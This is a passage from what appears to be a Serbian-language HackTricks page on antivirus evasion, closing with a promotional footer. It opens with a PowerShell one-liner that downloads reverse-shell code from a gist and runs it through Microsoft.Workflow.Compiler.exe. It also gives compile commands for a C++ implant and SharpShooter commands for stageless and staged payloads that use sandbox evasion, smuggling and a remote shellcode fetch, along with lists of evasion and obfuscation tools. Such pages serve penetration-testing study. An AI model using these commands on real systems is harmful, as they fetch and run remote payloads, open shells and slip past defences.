powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell
```

{% embed url="https://gist.github.com/BankSecurity/469ac5f9944ed1b8c39129dc0037bb8f" %}

Lista C# obfuskatora: [https://github.com/NotPrab/.NET-Obfuscator](https://github.com/NotPrab/.NET-Obfuscator)

### C++

```
sudo apt-get install mingw-w64

i686-w64-mingw32-g++ prometheus.cpp -o prometheus.exe -lws2_32 -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
```

* [https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp](https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp)
* [https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/](https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/)
* [https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf](https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf)
* [https://github.com/l0ss/Grouper2](ps://github.com/l0ss/Group)
* [http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html](http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html)
* [http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/](http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/)

### Korišćenje pythona za izgradnju primera ubacivača:

* [https://github.com/cocomelonc/peekaboo](https://github.com/cocomelonc/peekaboo)

### Ostali alati

```bash
# Veil Framework:
https://github.com/Veil-Framework/Veil

# Shellter
https://www.shellterproject.com/download/

# Sharpshooter
# https://github.com/mdsecactivebreach/SharpShooter
# Javascript Payload Stageless:
SharpShooter.py --stageless --dotnetver 4 --payload js --output foo --rawscfile ./raw.txt --sandbox 1=contoso,2,3

# Stageless HTA Payload:
SharpShooter.py --stageless --dotnetver 2 --payload hta --output foo --rawscfile ./raw.txt --sandbox 4 --smuggle --template mcafee

# Staged VBS:
SharpShooter.py --payload vbs --delivery both --output foo --web http://www.foo.bar/shellcode.payload --dns bar.foo --shellcode --scfile ./csharpsc.txt --sandbox 1=contoso --smuggle --template mcafee --dotnetver 4

# Donut:
https://github.com/TheWover/donut

# Vulcan
https://github.com/praetorian-code/vulcan
```

### Više

* [https://github.com/persianhydra/Xeexe-TopAntivirusEvasion](https://github.com/persianhydra/Xeexe-TopAntivirusEvasion)

<details>

<summary><strong>Naučite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi načini podrške HackTricks-u:

* Ako želite da vidite svoju **kompaniju reklamiranu na HackTricks-u** ili **preuzmete HackTricks u PDF formatu** proverite [**PLANOVE ZA PRIJATELJSTVO**](https://github.com/sponsors/carlospolop)!
* Nabavite [**zvanični PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), našu kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* **Pridružite se** 💬 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitteru** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>
